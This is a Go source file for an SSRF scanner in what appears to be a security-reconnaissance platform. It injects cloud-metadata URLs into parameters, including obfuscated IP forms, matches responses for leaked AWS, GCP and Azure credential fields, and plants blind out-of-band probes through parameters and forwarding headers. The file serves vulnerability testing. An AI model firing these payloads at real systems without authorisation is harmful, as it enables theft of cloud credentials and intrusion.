package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/recon-platform/internal/config"
	"github.com/recon-platform/internal/database"
	"github.com/recon-platform/internal/tools"
	"github.com/recon-platform/pkg/logger"
)

type SSRFScanner struct {
	db        *database.DB
	exec      *tools.Executor
	cfg       *config.Config
	logger    *logger.Logger
	broadcast BroadcastFunc
}

func NewSSRFScanner(db *database.DB, exec *tools.Executor, cfg *config.Config, log *logger.Logger, broadcast BroadcastFunc) *SSRFScanner {
	return &SSRFScanner{db: db, exec: exec, cfg: cfg, logger: log, broadcast: broadcast}
}

var ssrfHTTPClient = &http.Client{
	Transport: sharedHTTPTransport,
	Timeout:   15 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

// Cloud-metadata signatures — these must be tokens that appear ONLY in the
// actual metadata RESPONSE body, never in the request URL we send. Path tokens
// like `iam/security-credentials/` and `computeMetadata/v1` were REMOVED: they
// live in our payload URL, so any endpoint that merely reflects the parameter
// (e.g. "Redirecting to http://169.254.169.254/.../iam/security-credentials/")
// would match them and produce a false "SSRF confirmed". What remains is real
// response content: the credential JSON keys and IMDS listing fields.
var ssrfMetadataSignatures = []*regexp.Regexp{
	// AWS
	regexp.MustCompile(`(?i)"AccessKeyId"\s*:`),
	regexp.MustCompile(`(?i)"SecretAccessKey"\s*:`),
	regexp.MustCompile(`(?i)"Token"\s*:\s*"[A-Za-z0-9/+]{40,}`),
	regexp.MustCompile(`(?i)ami-launch-index`),
	regexp.MustCompile(`(?i)block-device-mapping`),
	regexp.MustCompile(`(?i)instance-action`),
	regexp.MustCompile(`(?i)"ManagedPolicyArns"`),
	regexp.MustCompile(`(?i)ssh-public-keys`),
	// GCP service-account metadata (requires Metadata-Flavor on many routes).
	regexp.MustCompile(`(?i)"email"\s*:\s*"[^"]+\.gserviceaccount\.com"`),
	regexp.MustCompile(`(?i)"serviceAccounts"\s*:\s*{`),
	// Azure IMDS (http://169.254.169.254/metadata/instance)
	regexp.MustCompile(`(?i)"azEnvironment"\s*:`),
	regexp.MustCompile(`(?i)"subscriptionId"\s*:`),
	regexp.MustCompile(`(?i)"vmScaleSetName"\s*:`),
	// Alibaba Cloud (http://100.100.100.200/latest/meta-data/)
	regexp.MustCompile(`(?i)owner-account-id`),
	regexp.MustCompile(`(?i)ram/security-credentials`),
	// DigitalOcean (http://169.254.169.254/metadata/v1/)
	regexp.MustCompile(`(?i)"droplet_id"\s*:`),
	regexp.MustCompile(`(?i)"interfaces"\s*:\s*{`),
	// Oracle Cloud Infrastructure (http://169.254.169.254/opc/v2/instance/)
	regexp.MustCompile(`(?i)"compartmentId"\s*:`),
	regexp.MustCompile(`(?i)"availabilityDomain"\s*:`),
}

// ssrfPayloadHostMarkers are strings that only exist because WE put the metadata
// host in the parameter. If any appears in the response, the endpoint reflected
// our payload — a genuine SSRF response (creds JSON / IMDS listing) never echoes
// the request URL. Their presence means "reflection, not SSRF" → discard.
var ssrfPayloadHostMarkers = []string{
	"169.254.169.254",
	"2852039166",
	"::ffff:169.254",
	"0251.0376.0251.0376",
	"0xa9fea9fe",
	"metadata.google.internal",
	"100.100.100.200",
}

// responseReflectsPayload reports whether the response merely echoed our SSRF
// payload URL back (the #1 SSRF false-positive: reflecting redirect/url params).
func responseReflectsPayload(body, payloadURL string) bool {
	if body == "" {
		return false
	}
	if strings.Contains(body, payloadURL) {
		return true
	}
	lb := strings.ToLower(body)
	for _, m := range ssrfPayloadHostMarkers {
		if strings.Contains(lb, strings.ToLower(m)) {
			return true
		}
	}
	return false
}

const ssrfMaxParams = 150

var ssrfInbandPayloads = []struct{ url, note string }{
	{"http://169.254.169.254/latest/meta-data/", "AWS IMDS"},
	{"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials"},
	{"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/?recursive=true", "GCP service-account metadata"},
	{"http://2852039166/latest/meta-data/", "AWS IMDS (decimal IP)"},
	{"http://[::ffff:169.254.169.254]/latest/meta-data/", "AWS IMDS (IPv4-mapped IPv6)"},
	{"http://0xa9fea9fe/latest/meta-data/", "AWS IMDS (hex IP)"},
	{"http://0251.0376.0251.0376/latest/meta-data/", "AWS IMDS (octal IP)"},
	{"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS"},
	{"http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"},
	{"http://169.254.169.254/metadata/v1/", "DigitalOcean metadata"},
	{"http://169.254.169.254/opc/v2/instance/", "Oracle Cloud metadata"},
}

// Run tests SSRF-prone parameters by pointing them at cloud-metadata endpoints
// and internal hosts, then confirming via metadata signatures in the response.
// Targeted + bounded so it stays fast even on big scopes.
func (s *SSRFScanner) Run(ctx context.Context, targetID string, logFn LogFunc) error {
	logFn("info", "ssrf", "Starting SSRF checks on URL-like parameters...")

	candidates := s.selectCandidates(ctx, targetID)
	logFn("info", "ssrf", fmt.Sprintf("Selected %d SSRF-prone parameters", len(candidates)))
	auth := loadAuthHeaders(ctx, s.db, targetID)
	if len(candidates) == 0 {
		// No in-band candidates, but blind (out-of-band) SSRF may still be planted
		// on URL-prone params whose fetch produces no visible response signal.
		s.plantBlindSSRF(ctx, targetID, logFn)
		s.plantBlindSSRFHeaders(ctx, targetID, auth, logFn)
		return nil
	}

	sem := make(chan struct{}, 8)
	var wg sync.WaitGroup
	var found atomic.Int64

	for _, c := range candidates {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(ip insertionPoint) {
			defer wg.Done()
			defer func() { <-sem }()

			// Baseline: the normal response for this endpoint. A signature that
			// already appears here is NOT from our injection — skip it. This
			// kills false positives from APIs whose normal JSON happens to
			// contain a metadata-like token.
			control := "https://" + newXSSToken("rcnssrf") + ".invalid/"
			baseline, baselineStatus := s.fetch(ctx, ip, control, auth)
			if looksLikeBlockPage(baselineStatus, baseline) {
				return
			}

			for _, pl := range ssrfInbandPayloads {
				body, status := s.fetch(ctx, ip, pl.url, auth)
				if body == "" {
					continue
				}
				if looksLikeBlockPage(status, body) {
					continue
				}
				// FALSE-POSITIVE GUARD: if the endpoint just echoed our payload URL
				// back into the response, this is reflection, not SSRF. A real
				// metadata fetch returns creds JSON / a field listing that never
				// contains the request URL or the metadata host.
				if responseReflectsPayload(body, pl.url) {
					continue
				}
				for _, sig := range ssrfMetadataSignatures {
					if sig.MatchString(body) && !sig.MatchString(baseline) {
						// Confirm once more to rule out a transient/dynamic body.
						body2, status2 := s.fetch(ctx, ip, pl.url, auth)
						control2, controlStatus := s.fetch(ctx, ip, "https://"+newXSSToken("rcnssrf")+".invalid/", auth)
						if looksLikeBlockPage(status2, body2) || looksLikeBlockPage(controlStatus, control2) ||
							responseReflectsPayload(body2, pl.url) || !sig.MatchString(body2) || sig.MatchString(control2) {
							continue
						}
						ev := fmt.Sprintf("Cloud-metadata response content (%s) returned via %s, absent from two controls and not payload reflection; reproduced twice [HTTP %d/%d, %s %s]",
							sig.String(), pl.note, status, status2, strings.ToUpper(ip.Method), insertionLocation(ip))
						s.storeConf(targetID, ip, pl.url, pl.note, ev, ConfPoC)
						found.Add(1)
						logFn("warn", "ssrf", fmt.Sprintf("SSRF CONFIRMED: %s param=%s [%s/%s] → %s",
							ip.URL, ip.Param, ip.Method, insertionLocation(ip), pl.note))
						s.notify(targetID, ip.URL, ip.Param)
						return
					}
				}
			}
		}(c)
	}
	wg.Wait()

	// Blind (out-of-band) SSRF — the SSRF objective OWNS its blind confirmation via
	// the shared OOB capability, so a single-objective SSRF scan gets full coverage
	// without pulling in a multi-class OAST module.
	s.plantBlindSSRF(ctx, targetID, logFn)
	s.plantBlindSSRFHeaders(ctx, targetID, auth, logFn)

	logFn("info", "ssrf", fmt.Sprintf("SSRF check done. Found %d.", found.Load()))
	return nil
}

// plantBlindSSRF plants out-of-band SSRF probes over every URL-prone insertion
// point (no-op without a configured callback URL). A callback proves the server
// fetched our host — reported as a blind_ssrf finding via RecordOOBHit. This is
// the SSRF detector owning its own blind payloads + confirmation.
func (s *SSRFScanner) plantBlindSSRF(ctx context.Context, targetID string, logFn LogFunc) {
	o, ok := newOOBCapability(s.cfg)
	if !ok {
		return
	}
	points := s.selectCandidates(ctx, targetID)
	if len(points) == 0 {
		return
	}
	auth := loadAuthHeaders(ctx, s.db, targetID)
	n := o.plantClass(ctx, s.db, targetID, points, auth, "ssrf",
		nil,
		func(ip insertionPoint, cb string) []string { return ssrfOOBPayloads(cb, o.callbackHost, ip.Value) })
	if n > 0 {
		logFn("info", "ssrf", fmt.Sprintf("Planted %d blind-SSRF OOB probe(s); execution reported via callback.", n))
	}
}

// plantBlindSSRFHeaders covers hidden URL sinks that are not represented in the
// parameters table. Referer-based fetches are a documented blind-SSRF surface;
// proxy/routing headers are included because real applications pass them into
// preview, audit and callback services. Each header gets its own token/request so
// a callback identifies the exact sink rather than merely the host.
func (s *SSRFScanner) plantBlindSSRFHeaders(ctx context.Context, targetID string, auth map[string]string, logFn LogFunc) {
	o, ok := newOOBCapability(s.cfg)
	if !ok {
		return
	}
	roots := (&OASTScanner{db: s.db}).aliveRoots(ctx, targetID)
	if len(roots) == 0 {
		return
	}
	headers := []struct {
		name     string
		hostOnly bool
		wrap     func(string) string
	}{
		{name: "Referer"},
		{name: "X-Forwarded-Host", hostOnly: true},
		{name: "X-Forwarded-For", hostOnly: true},
		{name: "X-Original-URL"},
		{name: "X-Rewrite-URL"},
		{name: "Forwarded", hostOnly: true, wrap: func(v string) string { return `host="` + v + `"` }},
	}
	sem := make(chan struct{}, 10)
	var wg sync.WaitGroup
	planted := 0
	for _, root := range roots {
		for _, h := range headers {
			if ctx.Err() != nil {
				break
			}
			token := registerOOBProbe(s.db, targetID, root, h.name, "ssrf", "header:"+h.name)
			cb := o.callbackURL(token)
			value := cb
			if h.hostOnly {
				value = o.callbackHost
			}
			if h.wrap != nil {
				value = h.wrap(value)
			}
			planted++
			wg.Add(1)
			sem <- struct{}{}
			go func(root, header, value string) {
				defer wg.Done()
				defer func() { <-sem }()
				reqCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
				defer cancel()
				req, err := http.NewRequestWithContext(reqCtx, http.MethodGet, root, nil)
				if err != nil {
					return
				}
				req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ReconBot/1.0)")
				for k, v := range auth {
					req.Header.Set(k, v)
				}
				req.Header.Set(header, value)
				if resp, err := oastClient.Do(req); err == nil {
					resp.Body.Close()
				}
			}(root, h.name, value)
		}
	}
	wg.Wait()
	if planted > 0 {
		logFn("info", "ssrf", fmt.Sprintf("Planted %d header-specific blind-SSRF probe(s) across %d live roots.", planted, len(roots)))
	}
}

func (s *SSRFScanner) selectCandidates(ctx context.Context, targetID string) []insertionPoint {
	limit := ssrfMaxParams
	if s.cfg != nil {
		limit = s.cfg.URLLimit()
	}
	return loadRoutedInsertionPoints(ctx, s.db, targetID, ClassSSRF, limit, 32)
}

// fetch sends the request. For GCP metadata the Metadata-Flavor header is
// required, so we set it whenever the payload targets metadata.google.internal.
func (s *SSRFScanner) fetch(ctx context.Context, ip insertionPoint, payload string, auth map[string]string) (string, int) {
	reqCtx, cancel := context.WithTimeout(ctx, 12*time.Second)
	defer cancel()
	req, err := buildInjectedRequest(reqCtx, ip, payload, auth)
	if err != nil {
		return "", 0
	}
	if strings.Contains(payload, "metadata.google.internal") {
		req.Header.Set("Metadata-Flavor", "Google")
	}
	if strings.Contains(payload, "/metadata/instance") {
		req.Header.Set("Metadata", "true") // Azure IMDS requires this exact header
	}
	// OCI IMDSv2 expects Authorization on the server-side metadata request. Do
	// not set it on this outer request: that would overwrite the target's real
	// bearer token and turn every authenticated OCI probe into a false negative.
	host := hostOfURL(ip.URL)
	release, acquired := hostRequestAcquire(reqCtx, host)
	if !acquired {
		return "", 0
	}
	defer release()
	hostThrottleWait(reqCtx, host)
	resp, err := ssrfHTTPClient.Do(req)
	if err != nil {
		hostThrottleObserve(host, 0, true)
		return "", 0
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	resp.Body.Close()
	hostThrottleObserve(host, resp.StatusCode, false)
	return string(body), resp.StatusCode
}

func (s *SSRFScanner) storeConf(targetID string, ip insertionPoint, payload, subtype, evidence string, confidence int) {
	verdict := VerifyVerified
	if confidence < ConfEvidence {
		verdict = CandDetected
	}
	_, _ = RecordDetectorObservation(context.Background(), s.db, DetectorObservation{
		TargetID: targetID, Type: "ssrf", Subtype: subtype, Severity: "critical", URL: ip.URL, Method: ip.Method,
		Parameter: ip.Param, Location: insertionLocation(ip), Payload: payload, Evidence: evidence,
		Source: "ssrf-native", DetectionMethod: "differential-response-signature-replay", Confidence: confidence,
		Verdict: verdict,
	})
}

func (s *SSRFScanner) notify(targetID, rawURL, param string) {
	if s.broadcast != nil {
		s.broadcast("new_vuln_finding", map[string]any{
			"target_id": targetID, "type": "ssrf", "url": rawURL, "parameter": param,
		})
	}
}
